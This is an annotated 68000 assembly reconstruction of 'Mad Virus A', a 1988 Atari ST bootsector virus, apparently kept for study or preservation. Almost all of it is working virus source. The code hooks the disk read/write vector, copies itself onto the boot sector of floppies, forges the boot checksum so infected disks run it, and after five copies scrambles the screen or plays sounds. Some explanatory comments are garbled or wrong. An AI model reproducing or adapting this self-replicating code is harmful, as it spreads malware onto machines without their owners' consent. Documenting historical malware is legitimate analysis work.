; ----------------------------------------------------------------------------------------------------------
; Name: Mad Virus A.
; Type: Memory-resident bootsector virus.
; Discovery date: March 26th 1988 (Eerk Hofmeester).
; Virus can copy to drive(s): A or B (current drive).
; Virus attaches itself to: Hdv_rw vector.
; Disks can be immunized against it: Yes (0.B $60).
; Immunizable with UVK: Yes.
; What can happen: Fools around with screen or bleeps with the sound chip.
; When does that happen: After it makes five copies of itself, and then at every disk access.
; Reset-proof: No.
; Can copy to hard disk: No.
; Size: 484 bytes
;
; Remark: A relatively harmless virus, therefore also sometimes referred to as FUN Virus.
; This is improper, however, as there already is a virus sometimes called Fun Virus, too (the Merlin Mad Virus, #60).
; For more remarks on the Mad Virus, see Mad Virus B (#49). Weirdly, the Mad Virus is also known as Emil 2A Virus.
; ----------------------------------------------------------------------------------------------------------

; ----------------------------------------------------------------------------------------------------------
; Debug, not in the original code
; ----------------------------------------------------------------------------------------------------------
_DEBUG_                 equ 1
_CUSTOM_SOUND_          equ 0

; ----------------------------------------------------------------------------------------------------------
; Constants
; ----------------------------------------------------------------------------------------------------------
PHYSTOP                 equ $42E
VBLCLOCK_LOW            equ $465                        ; $000462|long |Counter for number of VBLs                           |_vbclock
VRAM_PTR                equ $44E                        ; $00044E|long |Pointer to video RAM (logical screen base)           |_v_bas_ad
HDV_RW                  equ $476                        ; $000476|long |Vector for read/write routine for hard disk          |hdv_rw
                                                        ; This vector is used when Rwabs() is called. A value of 0 here indicates that no hard disk is attached.
                                                        ; Applications installing themselves here should expect parameters to be located on the stack as they would
                                                        ; be for the actual function call STARTning at 4(sp). If the installed process services the call it should RTS,
                                                        ; otherwise, leaving the stack intact, should JMP through the old vector value
THE_ENV                 equ $4BC                        ; $0004BC|long |Pointer to default environment string, 4 zero bytes  |the_env
SCREEN_MEM              equ $FF8201                     ; $FF8201|byte |Video screen memory position (High byte)             |R/W

    ifne _CUSTOM_SOUND_
COPY_SIZE               equ $1D9                        ; 479 bytes to stop at the sound termination cmds
    else
COPY_SIZE               equ $1DF                        ; $1DF as in original  
    endif
NB_REPLICATION          equ 5

; system calls
XBIOS                   equ 14
DOSOUND                 equ $20
RWABS                   equ $4                          ; RWabs read and write disk sector:  long rwabs(int rwflag, long buffer, number, recno,dev)

VARIABLES_ADDR          equ START-$20

BOOTSECTOR_START        equ VARIABLES_ADDR+0            ; branch for bootsector: $601E
ORIGINAL_HDV_RW_VECTOR  equ VARIABLES_ADDR+2            ; long size, usually 0x00FC1A24
REPLICATION_COUNTER     equ VARIABLES_ADDR+6            ; word size
RESIDENT_OFFSET         equ $300

            TEXT

START:
            MOVEA.L   PHYSTOP.W,A1                      ; Load PHYSTOP in A1
            SUBA.L    #RESIDENT_OFFSET,A1               ; go back 768 bytes (ex: 7FD00 on 520), let's call it VARIABLES_ADDR
            LEA       BOOTSECTOR_START(PC),A0           ; read ahead of DSKBUFP of 32 bytes and get ptr in A0
            MOVE.W    #COPY_SIZE,D5                     ; loop size = COPY_SIZE (479 - 32 bytes of bootsector => $1BF)
.loop:
            MOVE.B    (A0,D5.W),(A1,D5.W)               ; copy bootsector - 32 bytes to upper ram
            DBF       D5,.loop
            CLR.W     6(A1)                             ; clear REPLICATION_COUNTER
            MOVE.L    HDV_RW.W,2(A1)                    ; save current hdv_rw vector in VARIABLES_ADDR+2 = ORIGINAL_HDV_RW_VECTOR
            ADDA.L    #$D4,A1                           ; move ptr to VARIABLES_ADDR+212 => (START-$20+$D4 = START+$B4) = HDV_RW_VECTOR
            MOVE.L    A1,HDV_RW.W                       ; set hdv_rw vector to HDV_RW_VECTOR
            RTS
            
; ----------------------------------------------------------------------------------------------------------
; Write bootsector
; params: D6: bootsector start byte
; boot sectore is not written if it already has this byte. With 0x60 it means only not executable
; bootsectors will be replaced.
; ----------------------------------------------------------------------------------------------------------            
WRITE_BOOTSECTOR:
            LINK      A6,#$FE00                         ; from caller, d6 = $60, link stack space, A6 pushed to the stack
            MOVEA.L   sp,A5                             ; A5 points to the new SP after displacement => floprd buffer
            MOVE.W    #8,D0                             ; d0 = 8 = floprd
            BSR.S     CALL_FLOPRD_OR_WR                 ; call CALL_FLOPRD_OR_WR for floprd
            CMP.B     (A5),D6                           ; if buf[0] == $60 => BRA, bootsector already written
            BEQ.S     .do_nothing                       ; call .do_nothing
            MOVE.L    A5,-(sp)                          ; else 
            LEA       BOOTSECTOR_START(PC),A0           ; A0 points to BOOTSECTOR_START 
            MOVE.W    BOOTSECTOR_START(PC),(A5)         ; patch bootsector with BOOTSECTOR_START content (0x601E)
            MOVE.W    #$1C1,D5                          ; for d5 = 1 to 449
.loop:
            MOVE.B    30(A0,D5.W),30(A5,D5.W)           ; copy BOOTSECTOR_START[449-i] to buffer[449-i]
            DBF       D5,.loop                          ; 
            CLR.W     D7                                ; d7 = 0
            CLR.W     510(A5)                           ; clear buffer[510]
            MOVE.W    #$FF,D5                           ; for d5 = 1 to 255 (=510 words)
.checksum_loop:
            ADD.W     (A5)+,D7                          ; compte word checksum
            DBF       D5,.checksum_loop                    
            MOVE.W    #$1234,D0                         ; D0 = magic checlksum number 0x1234
            SUB.W     D7,D0                             ; adjust checksum
            MOVE.W    D0,-2(A5)                         ; write last word to buffer

            MOVEA.L   (sp)+,A5                          ; set buffer on stack
            MOVE.W    #9,D0                             ; fd0 = 9 = flopwr
            BSR.S     CALL_FLOPRD_OR_WR                 ; call CALL_FLOPRD_OR_WR for flopwr
            TST.L     D0                                ; test write worked
            BMI.S     .do_nothing
            LEA       VARIABLES_ADDR(PC),A0             ; Load variables in A0
            ADDI.W    #1,30(A0)                         ; add 1 in START[-2] ???
            ADDI.W    #1,6(A0)                          ; add 1 in REPLICATION_COUNTER
.do_nothing:
            UNLK      A6                                ; remove space alloced on stack
            RTS
; ----------------------------------------------------------------------------------------------------------
; 
; ----------------------------------------------------------------------------------------------------------

CALL_FLOPRD_OR_WR:                                      ; Call Xbios opcode 8 or 9 (d0 is set by caller): Floprd() or Flopwr()
            MOVE.W    #1,-(sp)                          ; count = 1
            CLR.W     -(sp)                             ; side = 0
            CLR.W     -(sp)                             ; track = 0
            MOVE.W    #1,-(sp)                          ; sector = 1
            MOVE.W    FLOPPY_DRIVE(PC),-(sp)            ; dev = FLOPPY_DRIVE
            CLR.L     -(sp)                             ; rsrvd = 0
            MOVE.L    A5,-(sp)                          ; buf = A5
            MOVE.W    D0,-(sp)                          ; opcode 8 or 9
            TRAP      #XBIOS        
            ADDA.L    #$14,sp                           ; fix stack
            RTS

; ----------------------------------------------------------------------------------------------------------
; hdv_rw vector
; ----------------------------------------------------------------------------------------------------------
HDV_RW_VECTOR:        
            LEA       FLOPPY_DRIVE(PC),A0               ; Load FLOPPY_DRIVE in A0
            MOVE.W    14(sp),D0                         ; Rwabs() trigger this vector, get dev from stack
                                                        ; caller example:
                                                        ;   move.w dev,-(sp)   ; 14
                                                        ;   move.w recno,-(sp) ; 12
                                                        ;   move.w count,-(sp) ; 10
                                                        ;   pea buf,-(sp)      ; 6
                                                        ;   move.w mode,-(sp)  ; 4
                                                        ;   move.w #$04,-(sp)  ; 2
                                                        ;   trap #13
                                                        ;   lea 14(sp),sp

            MOVE.W    D0,(A0)                           ; store dev to FLOPPY_DRIVE
            ANDI.W    #$FFFE,D0                         ; dev & 1111 1111 1111 1110 => 0 only for 0 (A:) and 1 (B:)
            BEQ.S     .is_a_floppy                      ; if floppy go to .is_a_floppy
.branch_original_hdv_rw_vector:                         ; else to ORIGINAL_HDV_RW_VECTOR
            MOVEA.L   ORIGINAL_HDV_RW_VECTOR(PC),A0    
            JMP       (A0)
.is_a_floppy:
            MOVE.W    12(sp),D0                         ; Get recno parameter in the stack, recno specifies the first sector to read from.
            CMPI.W    #$B,D0                            ; if sector to read != 11, why ???
            BNE.S     .branch_original_hdv_rw_vector    ; go to ORIGINAL_HDV_RW_VECTOR 
                                                        ; else
            MOVEM.L   A0-A6/D0-D7,-(sp)                 ;  
            MOVE.W    REPLICATION_COUNTER(PC),D0        ; load counter
            CMPI.W    #NB_REPLICATION,D0                ; Check if counter >= NB_REPLICATION
            BLE.S     .not_yet                          ;    
            BSR.S     SELECT_FX                         ; go to SELECT_FX
.not_yet:                                               ; else
            MOVE.B    #$60,D6                           ; d6 = 0x60
            BSR       WRITE_BOOTSECTOR                  ; call WRITE_BOOTSECTOR
            MOVEM.L   (sp)+,A0-A6/D0-D7               

            BRA.S     .branch_original_hdv_rw_vector    ; gop to ORIGINAL_HDV_RW_VECTOR 
FLOPPY_DRIVE:
            DC.B      $00,$00

; ----------------------------------------------------------------------------------------------------------
; Select FX to run based on VBLCLOCK_LOW anded value
; ----------------------------------------------------------------------------------------------------------
SELECT_FX:      
            CLR.W     D0                               ; D0 = 0
            MOVE.B    VBLCLOCK_LOW.W,D0                ; D0.B = VBLCLOCK_LOW, this value indicates the number of vertical blanks that have been processed since the last reset
            ANDI.B    #7,D0                            ; keep only 3 low bits
            ; MOVE.W    #0, D0
            LEA       EFFECTS(PC),A0                   ; Load EFFECTS in A0
            MOVE.B    (A0,D0.W),D0                     ; D0 = EFFECTS[between 0 and 7] based on VBL counter $00,$14,$2C,$4E,$56,$60,$6C,$84
            LEA       EFFECT_00(PC),A0                 ; A0 = EFFECT_00
            ADDA.W    D0,A0                            ; Add offset to EFFECT_00
            JMP       (A0)                             ; then jump there

; ----------------------------------------------------------------------------------------------------------
; Mess display (invert colors in mono, invert to purple/black in low res)
; ----------------------------------------------------------------------------------------------------------            
EFFECT_00:                                             ; VRAM_PTR: this indicates the starting address of the logical screen. Prior to TOS 1.06, this address needed to be aligned on a 256 byte boundary
            MOVEA.L   VRAM_PTR.W,A0                    ; A0 = logical screen start
            MOVE.W    #$1F3F,D5                        ; for D5 in 7999 to 0 => 32000 pixels
.loop:
            EORI.L    #$FFFFFFFF,(A0)+                 ; XOR 4 bytes on each pixel value in bitplans  
            DBF       D5,.loop
            RTS

; ----------------------------------------------------------------------------------------------------------
; Shift screen 8 pixels bands to left
; ----------------------------------------------------------------------------------------------------------
EFFECT_14:
            MOVE.W    #$3F,D0                           ; d0 = 63
.loop:
            MOVEA.L   VRAM_PTR.W,A0                     ; A0 = logical screen start
            MOVE.W    #$3E7F,D5                         ; for D5 in 15999 to 0 => 16000 
.loop2:
            ROL       (A0)+                             ; rotate 16000 pixels
            DBF       D5,.loop2
            DBF       D0,.loop                          ; do it 64 times
            RTS

; ----------------------------------------------------------------------------------------------------------
; Shift half top with half bottom
; ----------------------------------------------------------------------------------------------------------
EFFECT_2C:
            BSR       INVERT_FX
INVERT_FX:
            MOVEA.L   VRAM_PTR.W,A0                     ; A0 = logical screen start
            MOVEA.L   A0,A1                             ; A1 = A0
            ADDA.L    #$3E80,A1                         ; A1 = logical screen start + 16000
            MOVE.W    #$3E7F,D5                         ; for d5 in 15999 to 0
.loop:
            MOVE.B    (A0),-(sp)                        ; add pixels[i] value to stack
            MOVE.B    (A1),-(sp)                        ; add pixels[i+16000] value to stack
            MOVE.B    (sp)+,(A0)+                       ; replace pixels[i] by pixels[i+16000]
            MOVE.B    (sp)+,(A1)+                       ; replace pixels[i+16000] by pixels[i]
            DBF       D5,.loop
            RTS

; ----------------------------------------------------------------------------------------------------------
; Merge display effects
; ----------------------------------------------------------------------------------------------------------        
EFFECT_4E:                                              
            BSR.S     EFFECT_00                         ; call FX Mess display
            BSR.S     EFFECT_14                         ; call FX Shift left display
            BSR.S     EFFECT_2C                         ; call FX invert display
            RTS

; ----------------------------------------------------------------------------------------------------------
; Slow down the invert effect
; ----------------------------------------------------------------------------------------------------------
EFFECT_56:        
            MOVE.W    #$13,D0
.loop:
            BSR.S     EFFECT_00                         ; call FX Mess display 19+1 times
            DBF       D0,.loop

; ----------------------------------------------------------------------------------------------------------
; Call screen invert effect with a pause in between
; ----------------------------------------------------------------------------------------------------------
EFFECT_60:            
            BSR.S     INVERT_FX                         ; call half top / half bottom screen invert effect
            MOVE.W    #$96,D0                           ; d0 = 150
            BSR.S     SLEEP                             ; call SLEEP
            BSR.S     INVERT_FX                         ; call half top / half bottom screen invert effect
            RTS

; ----------------------------------------------------------------------------------------------------------
; Flash the screen
; ----------------------------------------------------------------------------------------------------------
EFFECT_6C:
            ORI.B     #$10,SCREEN_MEM.L                 ; set all pixels to color 15
            MOVE.W    #$C8,D0                           ; D0 = 200
            BSR.S     SLEEP                             ; call SLEEP
            ANDI.B    #$EF,SCREEN_MEM.L                 ; reset pixels
            RTS

; ----------------------------------------------------------------------------------------------------------
; Play sounds
; ----------------------------------------------------------------------------------------------------------
EFFECT_84:
            PEA       SND_CMDS(PC)                      ; Load cmd list SND_CMDS on stack
            MOVE.W    #DOSOUND,-(sp)                    ; VOID Dosound(  char *cmdlist ) initializes and starts an interrupt driven sound playback routine using the PSG.
            TRAP      #XBIOS
            ADDQ.L    #6,sp
            RTS

; ----------------------------------------------------------------------------------------------------------
; Sleep fx
; ----------------------------------------------------------------------------------------------------------
SLEEP:
            ; The the_env system variable in Atari ST’s BIOS is located at address 0x4be1. 
            ; This variable is used to store the environment for the operating system and can be inherited by other programs1.
            ; A program called setenv has been created to set this variable1. 
            ; This program injects the environment into the basepage of the program executed via the exec_os vector (i.e., the GEM). 
            ; The environment can then be inherited by other programs using this variable thereafter as the AES passes it along1.
            ; The environment is typically set with a file that looks like this:
            ; MYVAR1=myvalue<cr><lf>
            ; MYVAR2=myvalue<cr><lf>
            MOVE.W    THE_ENV.W,D1                      ; copy the_env to d1
            ADD.W     D0,D1                             ; add d0 to the_env value (d0 is passed by caller)
.loop:
            CMP.W     THE_ENV.W,D1                      ; loop until if THE_ENV > d1, basically until if overflow on 16 bits
            BGE.S     .loop                             ; 
            RTS

; ----------------------------------------------------------------------------------------------------------
; 
; ----------------------------------------------------------------------------------------------------------
EFFECTS:
            DC.B      $00,$14,$2C,$4E,$56,$60,$6C,$84


SND_CMDS:
            ; Command byte:
            ; 0x00 - 0x0F: Select a PSG register (the register number is the command byte). 
            ; The next byte in the list will be loaded into this register. 

            ; 0x80: Store the next byte in a temporary register for use by command 0x81.

            ; 0x81: Three bytes follow this command. 
            ; The first is the PSG register to load with the value in the temporary register (set with command 0x80). 
            ; The second is a signed value to add to the temporary register until the value in the third byte is met.

            ; 0x82: If a 0 follows this command, this signals the end of processing. 
            ; Otherwise the value indicates the number of 50Hz ticks to wait until the processing of the next command.

            ifne _CUSTOM_SOUND_
            DC.W      $0000,$0101,$0201,$0301,$0402,$0501,$0738,$0810,$0910,$0A10,$0B00,$0C30,$0D03,$FF64,$0900,$0A00,$FF00         
            else
                rept 5
                DC.W      $3E01,$E34B,$D53D,$978C ; ????
                endr
            DC.W      $05DE,$F9FF
            DC.W      $FF00 ; the end of the sound list                   
            endif               
ZUEND: END


; The XBIOS Dosound function on Atari ST is used to play sounds. It takes a pointer to a list of commands that define the sound to be played. 
; Each command in the list consists of a word where the high byte is the command number and the low byte is the command parameter.
;    move.l  #sound, d1  ; Load the address of the sound data into d1
;    move.w  #32, d0     ; Dosound function number
;    trap    #14         ; Call XBIOS
;    ...
;sound:
;    dc.w    $0101       ; Set amplitude of channel A to 1
;    dc.w    $0205       ; Set coarse tuning of channel A to 5
;    dc.w    $030A       ; Set fine tuning of channel A to 10
;    dc.w    $04C0       ; Set control of channel A to C0 (volume only, square wave)
;    dc.w    $FF00       ; End of sound list
; The $FF00 command signifies the end of the sound list